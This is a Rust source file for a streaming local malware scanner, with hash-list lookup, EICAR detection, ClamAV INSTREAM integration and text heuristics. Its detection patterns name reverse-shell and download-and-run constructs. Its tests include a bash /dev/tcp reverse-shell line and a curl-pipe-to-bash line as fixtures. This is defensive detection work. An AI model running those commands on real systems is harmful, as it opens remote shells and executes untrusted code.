//! Streaming local file analysis. No WebAssembly, subprocesses, or whole-file buffers.
mod types;
use sha2::{Digest, Sha256};
#[cfg(windows)]
use std::net::TcpStream as UnixStream;
#[cfg(unix)]
use std::os::unix::{fs::OpenOptionsExt, net::UnixStream};
use std::{
    collections::BTreeMap,
    fs::OpenOptions,
    io::{self, BufRead, BufReader, Read, Write},
    path::{Path, PathBuf},
    sync::{
        atomic::{AtomicBool, AtomicU64, Ordering},
        Arc,
    },
    time::Duration,
};
fn open_regular(path: &Path) -> io::Result<std::fs::File> {
    let mut options = OpenOptions::new();
    options.read(true);
    // O_NOFOLLOW | O_NONBLOCK; O_NOFOLLOW differs between architectures.
    #[cfg(all(target_os = "linux", any(target_arch = "x86", target_arch = "x86_64")))]
    options.custom_flags(0x20000 | 0x800);
    #[cfg(all(target_os = "linux", any(target_arch = "aarch64", target_arch = "arm")))]
    options.custom_flags(0x8000 | 0x800);
    #[cfg(windows)]
    {
        use std::os::windows::fs::OpenOptionsExt;
        options.custom_flags(0x00200000); // FILE_FLAG_OPEN_REPARSE_POINT
    }
    let file = options.open(path)?;
    let meta = file.metadata()?;
    #[cfg(windows)]
    {
        use std::os::windows::fs::MetadataExt;
        if meta.file_attributes() & 0x400 != 0 {
            return Err(io::Error::other("Reparse points are skipped"));
        }
    }
    if !meta.is_file() {
        return Err(io::Error::other("Not a regular file"));
    }
    Ok(file)
}
pub use types::*;
pub const BUFFER_SIZE: usize = 256 * 1024;
const EICAR: &[u8] = br"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";
const EICAR_SHA256: [u8; 32] = [
    0x27, 0x5a, 0x02, 0x1b, 0xbf, 0xb6, 0x48, 0x9e, 0x54, 0xd4, 0x71, 0x89, 0x9f, 0x7d, 0xb9, 0xd1,
    0x66, 0x3f, 0xc6, 0x95, 0xec, 0x2f, 0xe2, 0xa2, 0xc4, 0x53, 0x8a, 0xab, 0xf6, 0x51, 0xfd, 0x0f,
];
pub type Database = BTreeMap<[u8; 32], String>;
/// Bundled, attributed SHA-256 IOC snapshot. Shared across all native workers.
pub fn bundled_database() -> Arc<Database> {
    static DB: std::sync::OnceLock<Arc<Database>> = std::sync::OnceLock::new();
    DB.get_or_init(|| {
        let mut db = Database::new();
        for line in include_str!("../data/loki-sha256.txt").lines() {
            if line.starts_with('#') || line.is_empty() {
                continue;
            }
            if let Some((hash, label)) = line.split_once(' ') {
                if let Some(hash) = decode_hash(hash) {
                    db.insert(hash, label.into());
                }
            }
        }
        Arc::new(db)
    })
    .clone()
}
#[derive(Clone, Copy, Debug, PartialEq)]
pub enum Mode {
    Hashes,
    Static,
    Clam,
}
impl Mode {
    pub fn parse(s: &str) -> Option<Self> {
        match s {
            "hashes" => Some(Self::Hashes),
            "static" => Some(Self::Static),
            "clam" => Some(Self::Clam),
            _ => None,
        }
    }
}
#[derive(Clone)]
pub struct Config {
    pub mode: Mode,
    pub database: Arc<Database>,
    pub clam_socket: Option<PathBuf>,
}
impl Default for Config {
    fn default() -> Self {
        Self {
            mode: Mode::Static,
            database: bundled_database(),
            clam_socket: detect_clam(),
        }
    }
}
/// Outcome of one inspection. `Match` is a signature hit; `Review` is a heuristic hint.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Status {
    Unknown,
    Empty,
    Review,
    Match,
    Error,
}
impl Status {
    pub fn as_str(self) -> &'static str {
        match self {
            Self::Unknown => "unknown",
            Self::Empty => "empty",
            Self::Review => "review",
            Self::Match => "match",
            Self::Error => "error",
        }
    }
}
impl std::fmt::Display for Status {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.write_str(self.as_str())
    }
}
/// Lowercase hex without a `format!` allocation per byte.
pub fn to_hex(bytes: &[u8]) -> String {
    const DIGITS: &[u8; 16] = b"0123456789abcdef";
    let mut out = String::with_capacity(bytes.len() * 2);
    for &b in bytes {
        out.push(DIGITS[usize::from(b >> 4)] as char);
        out.push(DIGITS[usize::from(b & 15)] as char);
    }
    out
}
#[derive(Debug)]
pub struct Report {
    pub path: PathBuf,
    pub bytes: u64,
    pub kind: u32,
    pub hash: String,
    pub status: Status,
    pub incomplete: bool,
    pub details: Vec<String>,
}
impl Report {
    pub fn error(path: PathBuf, error: impl ToString) -> Self {
        Self {
            path,
            bytes: 0,
            kind: 0,
            hash: String::new(),
            status: Status::Error,
            incomplete: true,
            details: vec![error.to_string()],
        }
    }
}
pub fn decode_hash(s: &str) -> Option<[u8; 32]> {
    if s.len() != 64 || !s.bytes().all(|b| b.is_ascii_hexdigit()) {
        return None;
    }
    let mut out = [0; 32];
    for (i, b) in out.iter_mut().enumerate() {
        *b = u8::from_str_radix(&s[i * 2..i * 2 + 2], 16).ok()?;
    }
    Some(out)
}
pub fn load_database(path: &Path) -> io::Result<Database> {
    let file = open_regular(path)?;
    let mut reader = BufReader::new(file);
    let mut db = Database::new();
    let mut number = 0;
    let mut bytes = Vec::new();
    loop {
        bytes.clear();
        let n = reader.by_ref().take(4097).read_until(b'\n', &mut bytes)?;
        if n == 0 {
            break;
        }
        number += 1;
        if n > 4096 {
            return Err(io::Error::other(format!(
                "Line {number} exceeds 4096 bytes"
            )));
        }
        let line = std::str::from_utf8(&bytes)
            .map_err(|_| io::Error::other(format!("Line {number} is not UTF-8")))?
            .trim();
        if line.is_empty() || line.starts_with('#') {
            continue;
        }
        let mut fields = line.splitn(2, char::is_whitespace);
        let key = decode_hash(fields.next().unwrap_or(""))
            .ok_or_else(|| io::Error::other(format!("Invalid SHA-256 on line {number}")))?;
        let label = fields
            .next()
            .unwrap_or("Imported blocklist match")
            .trim()
            .chars()
            .take(120)
            .collect();
        db.insert(key, label);
    }
    Ok(db)
}
/// Socket of the per-user `clamd` that the desktop app starts itself.
pub fn user_clam_socket() -> Option<PathBuf> {
    std::env::var_os("XDG_RUNTIME_DIR").map(|dir| PathBuf::from(dir).join("strazh-clamd.sock"))
}
/// Windows ClamAV has no Unix socket: the bundled clamd listens on loopback TCP.
#[cfg(windows)]
pub const WINDOWS_CLAM_ADDR: &str = "127.0.0.1:3311";
#[cfg(windows)]
fn clam_addr(text: &str) -> io::Result<std::net::SocketAddr> {
    let addr: std::net::SocketAddr = text
        .parse()
        .map_err(|_| io::Error::other("Invalid ClamAV address"))?;
    if !addr.ip().is_loopback() {
        return Err(io::Error::other("ClamAV must listen on this computer only"));
    }
    Ok(addr)
}
#[cfg(windows)]
pub fn detect_clam() -> Option<PathBuf> {
    let text = std::env::var("VIRUSTOTAL_CLAMD_TCP").unwrap_or_else(|_| WINDOWS_CLAM_ADDR.into());
    let addr = clam_addr(&text).ok()?;
    std::net::TcpStream::connect_timeout(&addr, Duration::from_millis(300)).ok()?;
    Some(PathBuf::from(text))
}
#[cfg(unix)]
pub fn detect_clam() -> Option<PathBuf> {
    let candidates = std::env::var_os("VIRUSTOTAL_CLAMD_SOCKET")
        .map(PathBuf::from)
        .into_iter()
        .chain(user_clam_socket())
        .chain(
            [
                "/run/clamav/clamd.ctl",
                "/run/clamav/clamd.sock",
                "/var/run/clamav/clamd.ctl",
            ]
            .map(PathBuf::from),
        );
    use std::os::unix::fs::FileTypeExt;
    candidates
        .into_iter()
        .find(|p| std::fs::metadata(p).is_ok_and(|m| m.file_type().is_socket()))
}
fn interrupted(cancel: &AtomicBool) -> io::Result<()> {
    if cancel.load(Ordering::Relaxed) {
        Err(io::Error::new(io::ErrorKind::Interrupted, "Cancelled"))
    } else {
        Ok(())
    }
}
struct Clam<S = UnixStream> {
    socket: S,
    frame: Vec<u8>,
    sent: u64,
}
impl Clam<UnixStream> {
    #[cfg(windows)]
    fn connect(path: &Path) -> io::Result<Self> {
        let addr = clam_addr(&path.to_string_lossy())?;
        let socket = UnixStream::connect_timeout(&addr, Duration::from_secs(2))?;
        socket.set_write_timeout(Some(Duration::from_secs(2)))?;
        socket.set_read_timeout(Some(Duration::from_millis(200)))?;
        Self::from_stream(socket)
    }
    #[cfg(unix)]
    fn connect(path: &Path) -> io::Result<Self> {
        let socket = UnixStream::connect(path)?;
        socket.set_write_timeout(Some(Duration::from_secs(2)))?;
        socket.set_read_timeout(Some(Duration::from_millis(200)))?;
        Self::from_stream(socket)
    }
}
impl<S: Read + Write> Clam<S> {
    fn from_stream(mut socket: S) -> io::Result<Self> {
        socket.write_all(b"zINSTREAM\0")?;
        Ok(Self {
            socket,
            frame: Vec::with_capacity(BUFFER_SIZE + 4),
            sent: 0,
        })
    }
    fn chunk(&mut self, bytes: &[u8]) -> io::Result<()> {
        // One syscall per chunk instead of two.
        self.frame.clear();
        self.frame
            .extend_from_slice(&(bytes.len() as u32).to_be_bytes());
        self.frame.extend_from_slice(bytes);
        self.sent += bytes.len() as u64;
        self.socket.write_all(&self.frame)
    }
    fn finish(mut self, cancel: &AtomicBool) -> io::Result<Option<String>> {
        self.socket.write_all(&0u32.to_be_bytes())?;
        // Large files take ClamAV a while: 60 s plus one second per 4 MiB. Cancel still works.
        let deadline =
            std::time::Instant::now() + Duration::from_secs(60 + self.sent / (4 * 1024 * 1024));
        let mut response = Vec::new();
        let mut buf = [0u8; 256];
        loop {
            interrupted(cancel)?;
            if std::time::Instant::now() > deadline {
                return Err(io::Error::new(
                    io::ErrorKind::TimedOut,
                    "ClamAV response timed out",
                ));
            }
            match self.socket.read(&mut buf) {
                Ok(0) => break,
                Ok(n) => {
                    response.extend_from_slice(&buf[..n]);
                    if response.len() > 8192 {
                        return Err(io::Error::other("ClamAV response too large"));
                    }
                    if response.contains(&0) || response.contains(&b'\n') {
                        break;
                    }
                }
                Err(e)
                    if matches!(
                        e.kind(),
                        io::ErrorKind::WouldBlock | io::ErrorKind::TimedOut
                    ) =>
                {
                    continue
                }
                Err(e) => return Err(e),
            }
        }
        parse_clam_response(&String::from_utf8_lossy(&response))
    }
}
fn parse_clam_response(response: &str) -> io::Result<Option<String>> {
    let response = response.trim_matches(['\0', '\r', '\n']);
    if response == "stream: OK" {
        Ok(None)
    } else if let Some(name) = response
        .strip_prefix("stream: ")
        .and_then(|s| s.strip_suffix(" FOUND"))
    {
        Ok(Some(format!("ClamAV: {name}")))
    } else {
        Err(io::Error::other(format!(
            "ClamAV did not complete: {}",
            response.chars().take(256).collect::<String>()
        )))
    }
}
// Prefilter on the first byte instead of comparing a long signature at
// every offset. Particularly useful for binary files and EICAR's 68-byte marker.
fn contains_bytes(haystack: &[u8], pattern: &[u8]) -> bool {
    if pattern.is_empty() {
        return true;
    }
    let Some(last) = haystack.len().checked_sub(pattern.len()) else {
        return false;
    };
    let mut offset = 0;
    while offset <= last {
        let Some(relative) = haystack[offset..=last]
            .iter()
            .position(|&b| b == pattern[0])
        else {
            return false;
        };
        offset += relative;
        if &haystack[offset..offset + pattern.len()] == pattern {
            return true;
        }
        offset += 1;
    }
    false
}
/// (finding label, patterns). Patterns are lowercase; any one hit sets the flag.
const TEXT_RULES: &[(&str, &[&[u8]])] = &[
    (
        "encoded command or Base64 decoding in text/script",
        &[
            b"-encodedcommand",
            b"frombase64string(",
            b"base64 -d |",
            b"base64 --decode |",
        ],
    ),
    (
        "hidden or policy-bypassing PowerShell window",
        &[
            b"-windowstyle hidden",
            b"-w hidden",
            b"-executionpolicy bypass",
            b"-ep bypass",
        ],
    ),
    (
        "Windows tools commonly abused to download or run code",
        &[
            b"certutil -urlcache",
            b"bitsadmin /transfer",
            b"mshta http",
            b"regsvr32 /s /n /u /i:http",
        ],
    ),
    (
        "reverse-shell construct",
        &[
            b"/dev/tcp/",
            b"nc -e ",
            b"bash -i >&",
            b"socket.socket(socket.af_inet",
        ],
    ),
    (
        "obfuscated JavaScript execution",
        &[
            b"eval(unescape(",
            b"eval(atob(",
            b"string.fromcharcode(",
            b"document.write(unescape(",
        ],
    ),
];
const DOWNLOADERS: &[&[u8]] = &[b"curl ", b"wget ", b"downloadstring(", b"invoke-webrequest"];
const EXECUTORS: &[&[u8]] = &[b"| sh", b"| bash", b"invoke-expression", b"iex(", b"iex "];
struct ContentChecks {
    eicar: bool,
    rules: [bool; TEXT_RULES.len()],
    downloader: bool,
    shell: bool,
    carry: Vec<u8>,
    scratch: Vec<u8>,
}
impl ContentChecks {
    fn new(capacity: usize) -> Self {
        Self {
            eicar: false,
            rules: [false; TEXT_RULES.len()],
            downloader: false,
            shell: false,
            carry: Vec::with_capacity(128),
            scratch: Vec::with_capacity(capacity + 128),
        }
    }
    fn feed(&mut self, bytes: &[u8], text: bool) {
        self.scratch.clear();
        self.scratch.extend_from_slice(&self.carry);
        self.scratch.extend_from_slice(bytes);
        self.carry.clear();
        self.carry
            .extend_from_slice(&self.scratch[self.scratch.len().saturating_sub(128)..]);
        self.eicar |= contains_bytes(&self.scratch, EICAR);
        if text {
            self.scratch.make_ascii_lowercase();
            let scratch = &self.scratch;
            let any = |list: &[&[u8]]| list.iter().any(|p| contains_bytes(scratch, p));
            for (flag, (_, patterns)) in self.rules.iter_mut().zip(TEXT_RULES) {
                *flag |= any(patterns);
            }
            self.downloader |= any(DOWNLOADERS);
            self.shell |= any(EXECUTORS);
        }
    }
}
/// `invoice.pdf.exe`: a document or media extension followed by a runnable one.
fn double_extension(path: &Path) -> bool {
    const RUNNABLE: &[&str] = &[
        "exe", "scr", "bat", "cmd", "com", "js", "vbs", "ps1", "hta", "jar", "lnk",
    ];
    let Some(name) = path.file_name().and_then(|n| n.to_str()) else {
        return false;
    };
    let name = name.to_ascii_lowercase();
    let mut parts = name.rsplit('.');
    let (Some(last), Some(prev), Some(_)) = (parts.next(), parts.next(), parts.next()) else {
        return false;
    };
    RUNNABLE.contains(&last) && DECOY_EXTENSIONS.contains(&prev)
}
const DECOY_EXTENSIONS: &[&str] = &[
    "jpg", "jpeg", "png", "gif", "bmp", "pdf", "txt", "doc", "docx", "xls", "xlsx", "ppt", "pptx",
    "rtf", "mp3", "mp4", "avi", "zip",
];
pub fn inspect(
    path: &Path,
    config: &Config,
    cancel: &AtomicBool,
    progress: &AtomicU64,
    buffer: &mut [u8],
) -> io::Result<Report> {
    interrupted(cancel)?;
    // Linux: O_NOFOLLOW | O_NONBLOCK prevents symlink/fifo replacement races.
    let mut file = open_regular(path)?;
    let before = file.metadata()?;
    if !before.is_file() {
        return Err(io::Error::other("Not a regular file"));
    }
    if buffer.is_empty() {
        return Err(io::Error::other("Empty read buffer"));
    }
    let mut hash = Sha256::new();
    let mut size = 0;
    let mut kind = T_EMPTY;
    let mut checks = (config.mode != Mode::Hashes).then(|| {
        ContentChecks::new(
            buffer
                .len()
                .min(usize::try_from(before.len()).unwrap_or(usize::MAX)),
        )
    });
    let mut clam_error = None;
    let mut clam = if config.mode == Mode::Clam {
        match config
            .clam_socket
            .as_deref()
            .ok_or_else(|| io::Error::other("No local ClamAV daemon socket configured"))
            .and_then(Clam::connect)
        {
            Ok(c) => Some(c),
            Err(e) => {
                clam_error = Some(e.to_string());
                None
            }
        }
    } else {
        None
    };
    loop {
        interrupted(cancel)?;
        let n = file.read(buffer)?;
        if n == 0 {
            break;
        }
        if size == 0 {
            kind = sniff_bytes(&buffer[..n.min(4096)]);
        }
        hash.update(&buffer[..n]);
        if let Some(checks) = &mut checks {
            checks.feed(&buffer[..n], matches!(kind, T_TEXT | T_SCRIPT));
        }
        if let Some(c) = &mut clam {
            if let Err(e) = c.chunk(&buffer[..n]) {
                clam_error = Some(e.to_string());
                clam = None;
            }
        }
        size += n as u64;
        progress.fetch_add(n as u64, Ordering::Relaxed);
    }
    interrupted(cancel)?;
    let after = file.metadata()?;
    if before.len() != after.len()
        || size != after.len()
        || before.modified().ok() != after.modified().ok()
    {
        return Err(io::Error::other(
            "File changed during scanning; scan it again",
        ));
    }
    let digest: [u8; 32] = hash.finalize().into();
    let mut report = Report {
        path: path.into(),
        bytes: size,
        kind,
        hash: to_hex(&digest),
        status: if size == 0 {
            Status::Empty
        } else {
            Status::Unknown
        },
        incomplete: false,
        details: Vec::new(),
    };
    if digest == EICAR_SHA256 || checks.as_ref().is_some_and(|c| c.eicar) {
        report.status = Status::Match;
        report
            .details
            .push("EICAR harmless antivirus test pattern".into());
    }
    if let Some(label) = config.database.get(&digest) {
        report.status = Status::Match;
        report.details.push(format!("Hash intelligence: {label}"));
    }
    if let Some(checks) = checks {
        if matches!(kind, T_TEXT | T_SCRIPT) {
            for (hit, (label, _)) in checks.rules.iter().zip(TEXT_RULES) {
                if *hit {
                    report.details.push(format!("Review: {label}"));
                }
            }
        }
        if checks.downloader && checks.shell {
            report.details.push(
                "Review: downloader and shell execution constructs in the same script".into(),
            );
        }
        let extension = path
            .extension()
            .and_then(|s| s.to_str())
            .unwrap_or("")
            .to_ascii_lowercase();
        if matches!(kind, T_WINDOWS_PROGRAM | T_LINUX_PROGRAM | T_MAC_PROGRAM)
            && DECOY_EXTENSIONS.contains(&extension.as_str())
        {
            report
                .details
                .push("Review: executable bytes disguised with a document/media extension".into());
        }
        if double_extension(path) {
            report
                .details
                .push("Review: double extension hides a runnable file type".into());
        }
        if !report.details.is_empty() && report.status == Status::Unknown {
            report.status = Status::Review;
        }
    }
    if let Some(clam) = clam {
        match clam.finish(cancel) {
            Ok(Some(name)) => {
                report.status = Status::Match;
                report.details.push(name);
            }
            Ok(None) => report
                .details
                .push("ClamAV: no signature match (within daemon scan limits)".into()),
            Err(e) if e.kind() == io::ErrorKind::Interrupted => return Err(e),
            Err(e) => clam_error = Some(e.to_string()),
        }
    }
    if let Some(error) = clam_error {
        report.incomplete = true;
        if report.status != Status::Match {
            report.status = Status::Error;
        }
        report.details.push(format!("ClamAV incomplete: {error}"));
    }
    Ok(report)
}
pub fn file_type(kind: u32) -> &'static str {
    [
        "Data",
        "Windows executable",
        "Linux executable",
        "macOS executable",
        "PDF",
        "ZIP archive",
        "PNG image",
        "JPEG image",
        "GIF image",
        "Script",
        "Text",
        "RAR archive",
        "7-Zip archive",
        "Gzip archive",
        "Office document",
        "WebAssembly",
        "Empty",
        "Java class/macOS binary",
    ]
    .get(kind as usize)
    .copied()
    .unwrap_or("Data")
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::sync::atomic::AtomicUsize;
    static SEQUENCE: AtomicUsize = AtomicUsize::new(0);
    struct Fixture(PathBuf);
    impl Fixture {
        fn new(bytes: &[u8], extension: &str) -> Self {
            let path = std::env::temp_dir().join(format!(
                "vt-engine-{}-{}.{}",
                std::process::id(),
                SEQUENCE.fetch_add(1, Ordering::Relaxed),
                extension
            ));
            std::fs::write(&path, bytes).unwrap();
            Self(path)
        }
        fn inspect(&self, config: &Config, chunk: usize) -> Report {
            inspect(
                &self.0,
                config,
                &AtomicBool::new(false),
                &AtomicU64::new(0),
                &mut vec![0; chunk],
            )
            .unwrap()
        }
    }
    impl Drop for Fixture {
        fn drop(&mut self) {
            let _ = std::fs::remove_file(&self.0);
        }
    }
    #[test]
    fn eicar_detection_crosses_every_boundary() {
        let mut content = vec![b'-'; 17];
        content.extend_from_slice(EICAR);
        content.extend_from_slice(b"\r\n");
        let f = Fixture::new(&content, "txt");
        for chunk in [1, 3, 16, 32, 64, BUFFER_SIZE] {
            let r = f.inspect(&Config::default(), chunk);
            assert_eq!(r.status, Status::Match, "chunk {chunk}");
            assert!(r.details[0].contains("EICAR"));
        }
        let f = Fixture::new(EICAR, "txt");
        let config = Config {
            mode: Mode::Hashes,
            ..Config::default()
        };
        assert_eq!(f.inspect(&config, 32).status, Status::Match);
    }
    #[test]
    fn streaming_digest_and_type() {
        let data = vec![b'a'; BUFFER_SIZE * 3 + 11];
        let f = Fixture::new(&data, "txt");
        let r = f.inspect(&Config::default(), BUFFER_SIZE);
        assert_eq!(r.bytes, data.len() as u64);
        assert_eq!(r.kind, T_TEXT);
        assert_eq!(r.status, Status::Unknown);
        assert_eq!(r.hash, to_hex(&Sha256::digest(&data)));
        assert_eq!(
            Fixture::new(b"", "txt")
                .inspect(&Config::default(), 32)
                .status,
            Status::Empty
        );
        assert_eq!(sniff_bytes(b"\x7fELF"), T_LINUX_PROGRAM);
        assert_eq!(sniff_bytes(b"%PDF-1.7"), T_PDF);
    }
    #[test]
    fn heuristics_are_review_not_malware() {
        let f = Fixture::new(b"#!/bin/sh\nCuRL example.invalid/file | baSH", "sh");
        let r = f.inspect(&Config::default(), 7);
        assert_eq!(r.status, Status::Review);
        let config = Config {
            mode: Mode::Hashes,
            ..Config::default()
        };
        assert_eq!(f.inspect(&config, 64).status, Status::Unknown);
        let f = Fixture::new(b"MZ\x90\0", "pdf");
        assert_eq!(f.inspect(&Config::default(), 64).status, Status::Review);
        let f = Fixture::new(b"powershell -EncodedCommand ZWNobyBoZWxsbw==", "ps1");
        assert_eq!(f.inspect(&Config::default(), 5).status, Status::Review);
    }
    #[test]
    fn imported_hashes_and_invalid_lists() {
        let file = Fixture::new(b"normal content", "txt");
        let hash = Sha256::digest(b"normal content");
        let hex = to_hex(&hash);
        let list = Fixture::new(
            format!("# comment\n{hex} Example threat\n").as_bytes(),
            "txt",
        );
        let config = Config {
            database: Arc::new(load_database(&list.0).unwrap()),
            ..Config::default()
        };
        let r = file.inspect(&config, 64);
        assert_eq!(r.status, Status::Match);
        assert!(r.details.iter().any(|s| s.contains("Example threat")));
        let bad = Fixture::new(b"not a hash", "txt");
        assert!(load_database(&bad.0).is_err());
        let long = Fixture::new(&vec![b'a'; 5000], "txt");
        assert!(load_database(&long.0).is_err());
        assert_eq!(decode_hash(&"é".repeat(32)), None);
    }
    #[test]
    fn new_heuristics_and_double_extension() {
        let f = Fixture::new(
            b"powershell -ExecutionPolicy Bypass -WindowStyle Hidden",
            "ps1",
        );
        let r = f.inspect(&Config::default(), 9);
        assert_eq!(r.status, Status::Review);
        assert!(r.details.iter().any(|d| d.contains("PowerShell")));
        let f = Fixture::new(b"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", "sh");
        assert!(f
            .inspect(&Config::default(), 64)
            .details
            .iter()
            .any(|d| d.contains("reverse-shell")));
        assert!(double_extension(Path::new("invoice.PDF.exe")));
        assert!(!double_extension(Path::new("setup.exe")));
        assert!(!double_extension(Path::new("notes.txt")));
        let f = Fixture::new(b"hello", "pdf.scr");
        assert_eq!(f.inspect(&Config::default(), 64).status, Status::Review);
    }
    #[test]
    fn hex_helpers_round_trip() {
        let hex = "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f";
        assert_eq!(decode_hash(hex), Some(EICAR_SHA256));
        assert_eq!(to_hex(&EICAR_SHA256), hex);
        assert_eq!(to_hex(&Sha256::digest(EICAR)), hex);
    }
    #[test]
    fn cancellation_and_symlinks() {
        let f = Fixture::new(b"hello", "txt");
        let cancel = AtomicBool::new(true);
        assert_eq!(
            inspect(
                &f.0,
                &Config::default(),
                &cancel,
                &AtomicU64::new(0),
                &mut [0; 64]
            )
            .unwrap_err()
            .kind(),
            io::ErrorKind::Interrupted
        );
        #[cfg(unix)]
        {
            let link = Fixture::new(b"", "link");
            std::fs::remove_file(&link.0).unwrap();
            std::os::unix::fs::symlink(&f.0, &link.0).unwrap();
            assert!(inspect(
                &link.0,
                &Config::default(),
                &AtomicBool::new(false),
                &AtomicU64::new(0),
                &mut [0; 64]
            )
            .is_err());
        }
    }
    #[test]
    fn clam_replies_fail_closed() {
        assert_eq!(parse_clam_response("stream: OK\0").unwrap(), None);
        assert_eq!(
            parse_clam_response("stream: Test-Signature FOUND\0").unwrap(),
            Some("ClamAV: Test-Signature".into())
        );
        for response in [
            "",
            "stream: ERROR",
            "INSTREAM size limit exceeded. ERROR",
            "garbage",
        ] {
            assert!(parse_clam_response(response).is_err());
        }
    }
    #[test]
    fn clam_stream_protocol_and_cancellation() {
        // Exercise exactly the production framing and parser with an in-memory
        // transport; this sandbox blocks socket sends, including socketpair.
        struct Transport {
            response: io::Cursor<Vec<u8>>,
            sent: Arc<std::sync::Mutex<Vec<u8>>>,
        }
        impl Read for Transport {
            fn read(&mut self, b: &mut [u8]) -> io::Result<usize> {
                self.response.read(b)
            }
        }
        impl Write for Transport {
            fn write(&mut self, b: &[u8]) -> io::Result<usize> {
                self.sent.lock().unwrap().extend_from_slice(b);
                Ok(b.len())
            }
            fn flush(&mut self) -> io::Result<()> {
                Ok(())
            }
        }
        let sent = Arc::new(std::sync::Mutex::new(Vec::new()));
        let transport = Transport {
            response: io::Cursor::new(b"stream: Fake-Test FOUND\0".to_vec()),
            sent: sent.clone(),
        };
        let mut clam = Clam::from_stream(transport).unwrap();
        clam.chunk(b"test").unwrap();
        clam.chunk(b" content").unwrap();
        assert_eq!(
            clam.finish(&AtomicBool::new(false)).unwrap(),
            Some("ClamAV: Fake-Test".into())
        );
        let mut expected = b"zINSTREAM\0".to_vec();
        expected.extend_from_slice(&4u32.to_be_bytes());
        expected.extend_from_slice(b"test");
        expected.extend_from_slice(&8u32.to_be_bytes());
        expected.extend_from_slice(b" content");
        expected.extend_from_slice(&0u32.to_be_bytes());
        assert_eq!(*sent.lock().unwrap(), expected);
        let transport = Transport {
            response: io::Cursor::new(Vec::new()),
            sent: sent.clone(),
        };
        let clam = Clam::from_stream(transport).unwrap();
        assert_eq!(
            clam.finish(&AtomicBool::new(true)).unwrap_err().kind(),
            io::ErrorKind::Interrupted
        );
        let f = Fixture::new(b"test content", "txt");
        let config = Config {
            mode: Mode::Clam,
            clam_socket: Some(PathBuf::from("/nonexistent/clamd.sock")),
            ..Config::default()
        };
        let r = f.inspect(&config, 4);
        assert_eq!(r.status, Status::Error);
        assert!(!r.hash.is_empty());
        assert!(r.incomplete);
        let eicar = Fixture::new(EICAR, "txt");
        let r = eicar.inspect(&config, 64);
        assert_eq!(r.status, Status::Match);
        assert!(r.incomplete, "a known match must not hide a ClamAV failure");
    }
}

#[cfg(test)]
mod bundled_tests {
    #[test]
    fn bundled_indicators_are_valid_and_loaded() {
        let db = super::bundled_database();
        assert_eq!(db.len(), 1175);
        assert!(db.contains_key(
            &super::decode_hash("ce583821191345274cd954b2db7da9742c239fe413fc17dcb97ffdd7b51cb072")
                .unwrap()
        ));
        assert_eq!(super::Config::default().database.len(), db.len());
    }
}
